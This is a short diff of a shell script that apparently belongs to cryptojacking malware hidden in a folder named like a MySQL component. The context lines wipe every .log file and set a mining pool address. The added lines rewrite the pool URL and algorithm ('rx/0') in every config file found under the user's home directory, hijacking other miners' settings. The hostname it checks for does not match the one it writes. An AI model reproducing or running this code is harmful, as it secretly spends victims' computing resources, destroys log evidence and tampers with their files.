@@ -52,3 +52,6 @@ ls *.log | xargs -I x -n 1 sh -c "echo > x”
 
 cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
 grep -q "x.u8pool.com:13555" config.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' $HOME/myssqltcp/config.json
+
+cd $HOME/
+grep -r "x.u8spoo8l.com:13555" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8spool.com:13555",/' `grep url -rl ./` && sed -i 's/"algo": *"[^"]*",/"algo": "rx\/0",/' `grep url -rl ./`
